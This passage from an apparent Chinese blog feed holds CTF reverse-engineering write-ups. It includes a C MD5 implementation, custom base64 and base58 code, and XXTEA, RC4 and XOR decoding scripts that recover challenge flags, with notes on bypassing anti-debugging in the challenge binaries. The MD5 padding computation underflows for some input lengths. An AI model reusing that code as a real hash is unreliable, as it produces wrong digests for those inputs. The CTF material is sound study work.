    memcpy(D, data + 12, 4);
    return;
&#125;

size_t md5_update(char **out, char const *input, size_t inLen)&#123;
    int i;
    int j;

    size_t bitLen = inLen * 8; // the bit length of input
    //size_t fillLen = 64 - (inLen - 56) % 64;  // the length of padding 
    //printf(&quot;len:%d\n&quot;,fillLen);
    size_t fillLen = 56 - (inLen % 64);
    //printf(&quot;temp:%d\n&quot;,temp);
    size_t filledLen = inLen + fillLen + 8; // the length after padding

    char *outBuf = (char*)calloc(filledLen, sizeof(char));
    memcpy(outBuf, input, inLen);
    outBuf[inLen] = 0x80;// padding 1
    

    j = sizeof(inLen);  // the length of input_lengh
    for (i = 0; i &lt; j; i++) &#123;
        memcpy(outBuf + filledLen - 8 + i, (char*)(&amp;bitLen) + i, 1); // LittleEndian
        //memcpy(outBuf + filledLen - 4 + i, (char*)(&amp;bitLen) + j - 1 - i, 1);
        
    &#125;

    *out = outBuf;  // the data after padding
    return filledLen; 
&#125;


void md5_transform(unsigned int *out,  char *input)&#123;
    memcpy(out,input,GROUP_SIZE);
    return;

&#125;




void data_round(unsigned int *A, unsigned int *B, unsigned int *C, unsigned int *D, unsigned int const *m)&#123;
    //int k;
    unsigned int a = *A;
    unsigned int b = *B;
    unsigned int c = *C;
    unsigned int d = *D;

    /* round 1 */
    FF(&amp;a,b,c,d,m[0],T[0],S[0]);
    FF(&amp;d,a,b,c,m[1],T[1],S[1]);
    FF(&amp;c,d,a,b,m[2],T[2],S[2]);
    FF(&amp;b,c,d,a,m[3],T[3],S[3]);
    FF(&amp;a,b,c,d,m[4],T[4],S[0]);
    FF(&amp;d,a,b,c,m[5],T[5],S[1]);
    FF(&amp;c,d,a,b,m[6],T[6],S[2]);
    FF(&amp;b,c,d,a,m[7],T[7],S[3]);	
    FF(&amp;a,b,c,d,m[8],T[8],S[0]);
    FF(&amp;d,a,b,c,m[9],T[9],S[1]);
    FF(&amp;c,d,a,b,m[10],T[10],S[2]);
    FF(&amp;b,c,d,a,m[11],T[11],S[3]);
    FF(&amp;a,b,c,d,m[12],T[12],S[0]);
    FF(&amp;d,a,b,c,m[13],T[13],S[1]);
    FF(&amp;c,d,a,b,m[14],T[14],S[2]);
    FF(&amp;b,c,d,a,m[15],T[15],S[3]);
    
    /* round 2 */
    GG(&amp;a,b,c,d,m[1],T[16],S[4]);
    GG(&amp;d,a,b,c,m[6],T[17],S[5]);
    GG(&amp;c,d,a,b,m[11],T[18],S[6]);
    GG(&amp;b,c,d,a,m[0],T[19],S[7]);
    GG(&amp;a,b,c,d,m[5],T[20],S[4]);
    GG(&amp;d,a,b,c,m[10],T[21],S[5]);
    GG(&amp;c,d,a,b,m[15],T[22],S[6]);
    GG(&amp;b,c,d,a,m[4],T[23],S[7]);
    GG(&amp;a,b,c,d,m[9],T[24],S[4]);
    GG(&amp;d,a,b,c,m[14],T[25],S[5]);
    GG(&amp;c,d,a,b,m[3],T[26],S[6]);
    GG(&amp;b,c,d,a,m[8],T[27],S[7]);
    GG(&amp;a,b,c,d,m[13],T[28],S[4]);
    GG(&amp;d,a,b,c,m[2],T[29],S[5]);
    GG(&amp;c,d,a,b,m[7],T[30],S[6]);
    GG(&amp;b,c,d,a,m[12],T[31],S[7]);

    /* round 3 */
     HH(&amp;a,b,c,d,m[5],T[32],S[8]);
     HH(&amp;d,a,b,c,m[8],T[33],S[9]);
     HH(&amp;c,d,a,b,m[11],T[34],S[10]);
     HH(&amp;b,c,d,a,m[14],T[35],S[11]);
     HH(&amp;a,b,c,d,m[1],T[36],S[8]);
     HH(&amp;d,a,b,c,m[4],T[37],S[9]);
     HH(&amp;c,d,a,b,m[7],T[38],S[10]);
     HH(&amp;b,c,d,a,m[10],T[39],S[11]);
     HH(&amp;a,b,c,d,m[13],T[40],S[8]);
     HH(&amp;d,a,b,c,m[0],T[41],S[9]);
     HH(&amp;c,d,a,b,m[3],T[42],S[10]);
     HH(&amp;b,c,d,a,m[6],T[43],S[11]);
     HH(&amp;a,b,c,d,m[9],T[44],S[8]);
     HH(&amp;d,a,b,c,m[12],T[45],S[9]);
     HH(&amp;c,d,a,b,m[15],T[46],S[10]);
     HH(&amp;b,c,d,a,m[2],T[47],S[11]);
  
    /* round 4 */
    II(&amp;a,b,c,d,m[0],T[48],S[12]);
    II(&amp;d,a,b,c,m[7],T[49],S[13]);
    II(&amp;c,d,a,b,m[14],T[50],S[14]);
    II(&amp;b,c,d,a,m[5],T[51],S[15]);
    II(&amp;a,b,c,d,m[12],T[52],S[12]);
    II(&amp;d,a,b,c,m[3],T[53],S[13]);
    II(&amp;c,d,a,b,m[10],T[54],S[14]);
    II(&amp;b,c,d,a,m[1],T[55],S[15]);
    II(&amp;a,b,c,d,m[8],T[56],S[12]);
    II(&amp;d,a,b,c,m[15],T[57],S[13]);
    II(&amp;c,d,a,b,m[6],T[58],S[14]);
    II(&amp;b,c,d,a,m[13],T[59],S[15]);
    II(&amp;a,b,c,d,m[4],T[60],S[12]);
    II(&amp;d,a,b,c,m[11],T[61],S[13]);
    II(&amp;c,d,a,b,m[2],T[62],S[14]);
    II(&amp;b,c,d,a,m[9],T[63],S[15]);

    *A += a;
    *B += b;
    *C += c;
    *D += d;
&#125;


void md5_calc(char *out, char const *input, size_t inLen)&#123;
    int i;
    size_t filledLen;
    char *filledData; 
    unsigned int A,B,C,D;
    unsigned int *M = (unsigned int*)malloc(GROUP_SIZE);

    filledLen = md5_update(&amp;filledData,input,inLen);  

    //printf(&quot;input:%s\n&quot;,input);
    
    md5_init(&amp;A,&amp;B,&amp;C,&amp;D);
    //printf(&quot;%x\n%x\n%x\n%x\n&quot;,A,B,C,D);

    for(i = 0;i &lt; filledLen / GROUP_SIZE;i++)&#123;
        md5_transform(M, filledData + i * 64);  //char to int 
        data_round(&amp;A,&amp;B,&amp;C,&amp;D,M);
    &#125;

    //printf(&quot;%x\n%x\n%x\n%x\n&quot;,A,B,C,D); 

    sprintf(out,&quot;%08x%08x%08x%08x&quot;,shift(A),shift(B),shift(C),shift(D));

    free(M);
    M = NULL;
    free(filledData);
    filledData = NULL;

    return;

&#125;
</code></pre>
<h2 id="其他-1"><a href="#其他-1" class="headerlink" title="其他"></a>其他</h2><h3 id="大数计算"><a href="#大数计算" class="headerlink" title="大数计算"></a>大数计算</h3><h3 id="base系列"><a href="#base系列" class="headerlink" title="base系列"></a>base系列</h3><h4 id="base64换表"><a href="#base64换表" class="headerlink" title="base64换表"></a>base64换表</h4><pre><code class="python">&quot;&quot;&quot;
Customized base64 algorithm
You can set you own indexing string using the config() method.
Usage:
    b = CusBase64()
    b.encode(&#39;binary\x00string&#39;)  # Output: YmluYXJ5AHN0cmluZw==
    b.decode(&#39;YmluYXJ5AHN0cmluZw==&#39;) # Output: binary\x00string
    b.config(&#39;aABCDEFGHIJKLMNOPQRSTUVWXYZbcdefghijklmnopqrstuvwxyz0123456789+/&#39;)
    b.decode(&#39;c2UsYi1kYWM0cnUjdFlvbiAjb21wbFU0YP==&#39;) # Output: self-destruction complete
&quot;&quot;&quot;
class CusBase64(object):
    DEFAULT = &quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;

    def __init__(self):
        self.idx_str = CusBase64.DEFAULT

    def encode(self, str):
        &quot;&quot;&quot;
        Encode string using the customized indexing string.
        - args:
            str: String to be encoded
        &quot;&quot;&quot;
        # Get the binary string
        binary = &#39;&#39;.join([format(ord(c),&#39;0&gt;8b&#39;) for c in str])
        # Add additional zero
        binary = self.padding(binary)
        # Get the index in indexing string
        idxs = [int(binary[6*i:6*i+6], 2) for i in range(len(binary)//6)]

        result = &#39;&#39;.join([self.idx_str[i] for i in idxs])
        # add &#39;=&#39;
        if len(str)%3 != 0:
            result = result + (3-len(str)%3)*&#39;=&#39;

        print(&quot;%r&quot; % result)


    def decode(self, str):
        &quot;&quot;&quot;
        Decode string using the customized indexing string.
        - args:
            str: String to be decoded
        &quot;&quot;&quot;
        if len(str) == 0:
            return

        # remove &#39;=&#39;
        while str[-1]==&#39;=&#39;:
            str = str[:-1]
        try:
            # Get the binary string
            binary = &#39;&#39;.join([format(self.idx_str.index(c), &#39;0&gt;6b&#39;) for c in str])

            # Remove additional zero
            binary = self.remove(binary)

            result = &#39;&#39;.join([chr(int(binary[8*i:8*i+8], 2)) for i in range(len(binary)//8)])
        except ValueError:
            result = &quot;Please check again!&quot;

        print(&quot;%r&quot; % result)

    def remove(self, binary):
        &quot;&quot;&quot;
        Remove additional zero while decoding string.
        - args:
            binary: Binary format of the index.
        - returns:
            Binary string without additional zero.
        &quot;&quot;&quot;
        if len(binary)%8 == 0:
            return binary
        else:
            return binary[:-(len(binary)%8)]

    def padding(self, binary):
        &quot;&quot;&quot;
        Add additional zero while encoding string.
        - args:
            binary: Binary format of the string.
        - returns:
            Binary string with additional zero.
        &quot;&quot;&quot;
        if len(binary)%6 == 0:
            return binary
        n = 6 - len(binary)%6
        binary = binary + n * &#39;0&#39;
        return binary


    def config(self, str):
        &quot;&quot;&quot;
        Set customized indexing string.
        &quot;&quot;&quot;
        self.idx_str = str
        print(&quot;New indexing string is %r&quot; % self.idx_str)

b = CusBase64()
b.config(&#39;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#39;)
b.encode(&#39;flag&#123;this_is_a_sample_flag&#125;&#39;)
b.decode(&#39;mg6CITV6GEaFDTYnObFmENOAVjKcQmGncF90WhqvCFyhhsyqq1s=&#39;)
</code></pre>
<h4 id="base58"><a href="#base58" class="headerlink" title="base58"></a>base58</h4><pre><code class="go">package main

import (
    &quot;bytes&quot;
    &quot;math/big&quot;
)

var b58Alphabet = []byte(&quot;123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz&quot;)

func Base58Encode(input []byte) []byte &#123;
    var result []byte

    x := big.NewInt(0).SetBytes(input)

    base := big.NewInt(int64(len(b58Alphabet)))
    zero := big.NewInt(0)
    mod := &amp;big.Int&#123;&#125;

    for x.Cmp(zero) != 0 &#123;
        x.DivMod(x, base, mod)
        result = append(result, b58Alphabet[mod.Int64()])
    &#125;

    ReverseBytes(result)

    for _, b := range input &#123;
        if b == 0x00 &#123;
            result = append([]byte&#123;b58Alphabet[0]&#125;, result...)

        &#125; else &#123;
            break
        &#125;
    &#125;

    return result

&#125;

func Base58Decode(input []byte) []byte &#123;
    result := big.NewInt(0)
    zeroBytes := 0

    for _, b := range input &#123;
        if b != b58Alphabet[0] &#123;
            break
        &#125;

        zeroBytes++
    &#125;

    payload := input[zeroBytes:]
    for _, b := range payload &#123;
        charIndex := bytes.IndexByte(b58Alphabet, b)
        result.Mul(result, big.NewInt(int64(len(b58Alphabet))))
        result.Add(result, big.NewInt(int64(charIndex)))
    &#125;

    decoded := result.Bytes()
    decoded = append(bytes.Repeat([]byte&#123;byte(0x00)&#125;, zeroBytes), decoded...)

    return decoded
&#125;

</code></pre>
]]></content>
  </entry>
  <entry>
    <title>香山杯</title>
    <url>/2023/10/15/%E9%A6%99%E5%B1%B1%E6%9D%AF/</url>
    <content><![CDATA[<h6 id="PREFACE：比较简单的比赛，ak了re，ai题没看明白后续研究一下"><a href="#PREFACE：比较简单的比赛，ak了re，ai题没看明白后续研究一下" class="headerlink" title="PREFACE：比较简单的比赛，ak了re，ai题没看明白后续研究一下"></a>PREFACE：比较简单的比赛，ak了re，ai题没看明白后续研究一下</h6><span id="more"></span>

<h3 id="RE-URL从哪儿来"><a href="#RE-URL从哪儿来" class="headerlink" title="RE-URL从哪儿来"></a>RE-URL从哪儿来</h3><p>提取资源区并解密：</p>
<pre><code class="python">with open(&#39;./decE_OU101&#39;, &#39;wb&#39;) as file1:
    with open(&#39;./E_OU101&#39;, &#39;rb&#39;) as file:
        a = file.read()
        for i in a:
            if (i != 120 and i != 0):
                file1.write(bytes([i ^ 0x78]))
            else:
                file1.write(bytes([i]))
</code></pre>
<p>动调拿flag即可</p>
<p><img src="/2023/10/15/%E9%A6%99%E5%B1%B1%E6%9D%AF/image-20231015192950112.png" alt="image-20231015192950112"></p>
<h3 id="hello-py"><a href="#hello-py" class="headerlink" title="hello_py"></a>hello_py</h3><p>python安卓，提取后<code>hello_py\assets\chaquopy</code>这个路径下解压app.imy得到加密文件，xxtea，解密即可</p>
<pre><code class="python">from ctypes import *
class XXTEACipher:
    k = [c_uint32(0)]*4
    def __init__(self, key):
        if len(key)!=16:
            raise ValueError(&quot;Length of key must be 16 bytes long.&quot;)
        if type(key) != bytes:
            raise TypeError(&quot;Key must be a bytes object.&quot;)
        for i in range(4):
            tmp = c_uint32(0)
            for j in range(4):
                tmp.value = tmp.value &lt;&lt; 8
                tmp.value = tmp.value + key[4 * i + (3 - j)]
            self.k[i] = tmp

    def encrypt(self, plain):
        &quot;&quot;&quot;
        :param
            plain: byte string
                The plaintext that will be encrypted.
                It must to be a multiple of 4 bytes long.
        :return: bytes string
            The encrypted bytes.
        &quot;&quot;&quot;
        length = len(plain)
        if length % 4 != 0:
            raise ValueError(&quot;Length of plain must be a multiple of 4.&quot;)
        if type(plain) != bytes:
            raise TypeError(&quot;Plain must be a bytes object.&quot;)
        n = length // 4
        v = [c_uint32()]*n
        for i in range(n):
            tmp = c_uint32(0)
            for j in range(4):
                tmp.value = tmp.value &lt;&lt; 8
                tmp.value = tmp.value + plain[4 * i + (3 - j)]
            v[i] = tmp
        q = 6 + 52 // n
        z = c_uint32(v[n-1].value)
        y = c_uint32(v[0].value)
        sum_delta = c_uint32(0)
        delta = c_uint32(0x9e3779b9)
        for i in range(q)[::-1]:
            sum_delta.value += delta.value
            for p in range(n-1):
                e = (sum_delta.value &gt;&gt; 2) &amp; 3
                y.value = v[p+1].value
                v[p].value +=  ((z.value &gt;&gt; 5 ^ y.value &lt;&lt; 2) + (y.value &gt;&gt; 3 ^ z.value&lt;&lt;4)) ^ ((sum_delta.value ^ y.value) + (self.k[(p&amp;3)^e].value ^ z.value))
                z.value = v[p].value
            y.value = v[0].value
            v[n-1].value += ((z.value &gt;&gt; 5 ^ y.value &lt;&lt; 2) + (y.value &gt;&gt; 3 ^ z.value&lt;&lt;4)) ^ ((sum_delta.value ^ y.value) + (self.k[((n-1)&amp;3)^e].value ^ z.value))
            z.value = v[n-1].value
            print(&quot;0x%08x, 0x%8x&quot;%(v[0].value, v[1].value))
        cipher = b&quot;&quot;
        for i in range(n):
            for j in range(4):
                cipher+=bytes([v[i].value&amp;0xff])
                v[i].value = v[i].value &gt;&gt; 8
        return cipher

    def decrypt(self, cipher):
        &quot;&quot;&quot;
        :param
            plain: byte string
                The plaintext that will be encrypted.
                It must to be a multiple of 4 bytes long.
        :return: bytes string
            The encrypted bytes.
        &quot;&quot;&quot;
        length = len(cipher)
        if length % 4 != 0:
            raise ValueError(&quot;Length of cipher must be a multiple of 4.&quot;)
        if type(cipher) != bytes:
            raise TypeError(&quot;Cipher must be a bytes object.&quot;)
        n = length // 4
        v = [c_uint32()]*n
        for i in range(n):
            tmp = c_uint32(0)
            for j in range(4):
                tmp.value = tmp.value &lt;&lt; 8
                tmp.value = tmp.value + cipher[4 * i + (3 - j)]
            v[i] = tmp
        q = 6 + 52 // n
        z = c_uint32(0)
        y = c_uint32(v[0].value)
        delta = c_uint32(0x9e3779b9)
        sum_delta = c_uint32(q * delta.value)
        print(&quot;0x%08x, 0x%8x&quot;%(v[0].value, v[1].value))
        for i in range(q)[::-1]:
            e = (sum_delta.value &gt;&gt; 2) &amp; 3
            for p in range(1, n)[::-1]:
                z.value = v[p-1].value
                v[p].value -=  ((z.value &gt;&gt; 5 ^ y.value &lt;&lt; 2) + (y.value &gt;&gt; 3 ^ z.value&lt;&lt;4)) ^ ((sum_delta.value ^ y.value) + (self.k[(p&amp;3)^e].value ^ z.value))
                y.value = v[p].value
            z.value = v[n-1].value
            v[0].value -= ((z.value &gt;&gt; 5 ^ y.value &lt;&lt; 2) + (y.value &gt;&gt; 3 ^ z.value&lt;&lt;4)) ^ ((sum_delta.value ^ y.value) + (self.k[(0&amp;3)^e].value ^ z.value))
            y.value = v[0].value
            sum_delta.value -= delta.value
            print(&quot;0x%08x, 0x%8x&quot;%(v[0].value, v[1].value))
        plain = b&quot;&quot;
        for i in range(n):
            for j in range(4):
                plain+=bytes([v[i].value&amp;0xff])
                v[i].value = v[i].value &gt;&gt; 8
        return plain

def new(key):
    &quot;&quot;&quot;
    :param
        key: byte string
               key: byte string
            The secret key to use in the symmetric cipher.
            It must to be 16 bytes long.
    :return: A XXTEACipher object.
    &quot;&quot;&quot;
    return XXTEACipher(key)


if __name__ == &quot;__main__&quot;:
    import struct
    key = [12345678 ,12398712 ,91283904 ,12378192 ]
    key = struct.pack(&quot;&lt;IIII&quot;, *key)
    xxtea = XXTEACipher(key)
    cipher =[689085350 ,626885696 ,1894439255 ,1204672445 ,1869189675 ,475967424 ,1932042439 ,1280104741 ,2808893494 ] 
    cipher = struct.pack(&quot;&lt;IIIIIIIII&quot;, *cipher)
    plain = xxtea.decrypt(cipher)
    print(plain)
</code></pre>
<h3 id="nesting"><a href="#nesting" class="headerlink" title="nesting"></a>nesting</h3><p>虚拟机，模拟了很多opcode</p>
<p>先批量hook一下，然后发现是类似流密钥的操作，，总归对于flag仅有xor</p>
<p>单独hook得到xor的key，一位一位check的，动调一位一位xor解密输入即可</p>
<pre><code class="python"># print(hex(get_reg_value(&#39;eax&#39;)) + &#39; | &#39; + hex(get_reg_value(&#39;ecx&#39;)))

# print(hex(idc.get_wide_dword(get_reg_value(&quot;rbp&quot;) - 2)) + &#39; ==? &#39; + hex(get_reg_value(&#39;ax&#39;)))

# print(&#39;ax = &#39; + hex(get_reg_value(&#39;ax&#39;)))
# if (hex(get_reg_value(&#39;ax&#39;)) != &#39;0x0&#39;):
#     print(&#39;ax = &#39; + hex(get_reg_value(&#39;ax&#39;)))

# print(hex(get_reg_value(&#39;ax&#39;)) + &#39; ^ &#39; + hex(idc.get_wide_word(get_reg_value(&quot;rbp&quot;) - 2)))
# if (hex(idc.get_wide_word(get_reg_value(&quot;rbp&quot;) - 2)) != &#39;0x2a&#39;):
#     print(hex(get_reg_value(&#39;ax&#39;)) + &#39; ^ &#39; + hex(idc.get_wide_word(get_reg_value(&quot;rbp&quot;) - 2)))

# flag&#123;2c7c093b-f648-11ed-1111-11111111111&#125;

print(&#39;flag&#123;&#39;,end=&#39;&#39;)
print(chr(0x4 ^ 0x36),end=&#39;&#39;)
print(chr(0x5 ^ 0x66),end=&#39;&#39;)
print(chr(0x39 ^ 0xe),end=&#39;&#39;)
list = [0xe, 0x5d, 0x53, 0xc9, 0x4e, 0x46, 0xa, 0x13, 0x1, 0x3, 0x38, 0xa0,
        0xbb, 0xc7, 0x44, 0xfa, 0xbc, 0x3, 0x44, 0x2c, 0x9a, 0x6d, 0x98, 0x35,
        0x4f, 0x4a, 0x10,0xc4, 0x17, 0x9, 0x61, 0x06, 0xe1, 0x8d]
print(chr(0x5d ^ 0x3e),end=&#39;&#39;)
print(chr(0x53 ^ 0x63),end=&#39;&#39;)
print(chr(0xc9 ^ 0xf0),end=&#39;&#39;)
print(chr(0x4e ^ 0x7d),end=&#39;&#39;)
print(chr(0x46 ^ 0x24),end=&#39;&#39;)
print(chr(0xa ^ 0x27),end=&#39;&#39;)
print(chr(0x13 ^ 0x75),end=&#39;&#39;)
print(chr(1 ^ 0x37),end=&#39;&#39;)
print(chr(0x3 ^ 0x37),end=&#39;&#39;)
print(chr(0x38 ^ 0),end=&#39;&#39;)
# print(chr(0x21 ^ 0xa0),end=&#39;&#39;)
print(&#39;-11&#39;,end=&#39;&#39;)
print(chr(0x44 ^ 0x21),end=&#39;&#39;)
print(chr(0xfa ^ 0x9e),end=&#39;&#39;)
print(&#39;-&#39;,end=&#39;&#39;)
print(chr(3 ^ 0x62),end=&#39;&#39;)
print(chr(0x44 ^ 0x73),end=&#39;&#39;)
print(chr(0x1d ^ 0x2c),end=&#39;&#39;)
print(chr(0x9a ^ 0xac),end=&#39;&#39;)
print(&#39;-&#39;,end=&#39;&#39;)
print(chr(0x98 ^ 0xaf),end=&#39;&#39;)
print(chr(0x35 ^ 5),end=&#39;&#39;)
print(chr(0x7e ^ 0x4f),end=&#39;&#39;)
print(chr(0x2b ^ 0x4a),end=&#39;&#39;)
# print(&#39;-&#39;,end=&#39;&#39;)


print(chr( 0x10 ^ 0x72),end=&#39;&#39;)
print(chr(0xc4^ 0xfc),end=&#39;&#39;)
print(chr( 0x17^ 0x74),end=&#39;&#39;)
print(chr( 0x9^ 0x68),end=&#39;&#39;)
print(chr( 0x61^ 0x0),end=&#39;&#39;)
print(chr(0x06^ 0x67),end=&#39;&#39;)
print(chr( 0xe1^ 0x87 ),end=&#39;&#39;)
print(chr(0x8d^ 0xe8),end=&#39;&#39;)
print(&#39;&#125;&#39;)
</code></pre>
]]></content>
  </entry>
  <entry>
    <title>强网拟态2023</title>
    <url>/2023/11/12/%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%812023/</url>
    <content><![CDATA[<h6 id="PREFACE：初赛成绩一般，车联网那个vpn没看懂，属于是经验不足了"><a href="#PREFACE：初赛成绩一般，车联网那个vpn没看懂，属于是经验不足了" class="headerlink" title="PREFACE：初赛成绩一般，车联网那个vpn没看懂，属于是经验不足了"></a>PREFACE：初赛成绩一般，车联网那个vpn没看懂，属于是经验不足了</h6><h6 id="贴一下re吧，其实题有点难的（但是为啥那么多解呢，还是我太菜了嘛55555）"><a href="#贴一下re吧，其实题有点难的（但是为啥那么多解呢，还是我太菜了嘛55555）" class="headerlink" title="贴一下re吧，其实题有点难的（但是为啥那么多解呢，还是我太菜了嘛55555）"></a>贴一下re吧，其实题有点难的（<del>但是为啥那么多解呢，还是我太菜了嘛55555</del>）</h6><span id="more"></span>

<h3 id="fisher"><a href="#fisher" class="headerlink" title="fisher"></a>fisher</h3><p>前面的没什么用，把反调和格式检查过掉，然后手动改rip过sha1触发main里的异常处理，有一个函数里面有类似base变表的表，实则是自写的加密，可以把vector容器的符号表恢复一下方便看，逆该加密即可</p>
<pre><code class="python">encoded_flag = &#39;N17EHf1DWHD40DWH/f79E05EfIH1E179E1&#39;
decoded_flag = &#39;&#39;
table = &#39;ghijklpqrstuvwxyzABCabcDEFdef0123GHI4567JKL+/MNOmnoPQRSXYZ8TUVW9&#39; 

for c1, c2 in zip(encoded_flag[0::2], encoded_flag[1::2]):
    i1, i2 = table.index(c1), table.index(c2)
    row1, col1 = divmod(i1, 8)
    row2, col2 = divmod(i2, 8)

    if row1 != row2 and col1 != col2:
        col1, col2 = col2, col1
    elif row1 != row2:
        row1, row2 = (row1 + 7) % 8, (row2 + 7) % 8
    else:
        col1, col2 = (col1 + 7) % 8, (col2 + 7) % 8

    decoded_flag += table[row1 * 8 + col1] + table[row2 * 8 + col2]

print(decoded_flag.replace(&#39;X&#39;, &#39;&#39;))
</code></pre>
<h3 id="fafalua"><a href="#fafalua" class="headerlink" title="fafalua"></a>fafalua</h3><p>写作lua，实则发现是AngelScript语言的玩意，找到官方仓库看源码，发现samples里面有个games和这个程序的games一模一样，除了游戏过关后多一个输入check flag，以及.as被编译为asc，后缀改成flua</p>
<p>游戏本身没有用，改zf过掉即可</p>
<p>然后会输入，输入的flag会过一个gift，映射一下</p>
<p>打入符号表，asCContext::ExecuteNext函数会执行asc的opcode，这里猜测加密逻辑均在该函数中执行（调试非asc程序时会发现直接返回no~并打印）</p>
<p>直接对该函数的vm分发进行批量hook，会发现一直在执行这部分的xor，hook并打印，</p>
<p>经过调试发现这里只做了xor，发现在对flag处理中不会触发其他xor，且xor数量刚好为输入长度两倍</p>
<p>第一次xor中内存里看见deadbeef字符串，经过调试以及猜测发现是rc4</p>
<p>然后跟进调试hook，发现了另一个置换异或操作，数量恰好为0x26</p>
<p>均打印hook结果分析，猜测加密逻辑</p>
<p>得到解密脚本</p>
<pre><code class="python">from Crypto.Cipher import ARC4

# print(get_reg_value(&#39;edx&#39;),&quot; ^ &quot;,idc.get_wide_word(get_reg_value(&#39;rax&#39;)),&#39; = &#39;,get_reg_value(&#39;edx&#39;) ^ idc.get_wide_word(get_reg_value(&#39;rax&#39;)))

enc_idx = [0x27, 0xfd, 0x94, 0x28, 0x97, 0x7d, 0xcb, 0xd3, 0x31, 0xdd, 0xe, 0xcc, 0x97, 0xc9, 0xa8, 0x5, 0xae, 0xaf, 0x61, 0xd0, 0x88, 0xf8, 0xd7, 0xee, 0x16, 0x36, 0x67, 0x3a, 0x8c, 0x35, 0x97, 0x2c, 0x22, 0x17, 0xdd, 0xef, 0x9a, 0x96]

for i in range(0x25, -1, -1):
    enc_idx[i] ^= enc_idx[0x26 - i - 1]

table1 = [0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16]

enc = []
for b in enc_idx:
    enc.append(table1.index(b))


rc4 = ARC4.new(key=b&#39;deadbeef&#39;)
dec = rc4.decrypt(bytes(enc)).decode(&#39;utf-8&#39;)


table2 = &#39;abcdefghijklmnopqrstuvwxyz0123456789+/ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;
table3 = [0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x3E, 0xFF, 0xFF, 0xFF, 0x3F, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x3A, 0x3B, 0x3C, 0x3D, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16, 0x17, 0x18, 0x19, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0x1A, 0x1B, 0x1C, 0x1D, 0x1E, 0x1F, 0x20, 0x21, 0x22, 0x23, 0x24, 0x25, 0x26, 0x27, 0x28, 0x29, 0x2A, 0x2B, 0x2C, 0x2D, 0x2E, 0x2F, 0x30, 0x31, 0x32, 0x33, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xC0, 0xDF, 0x1E, 0x40, 0x01, 0x00, 0x00, 0x00]
flag = &#39;&#39;
for m in dec:
    if m in table2:
        flag += chr(table3.index(table2.index(m)))
        # flag += m
    else:
        flag += m
print(flag)
</code></pre>
]]></content>
  </entry>
  <entry>
    <title>长城杯2023</title>
    <url>/2023/09/13/%E9%95%BF%E5%9F%8E%E6%9D%AF2023/</url>
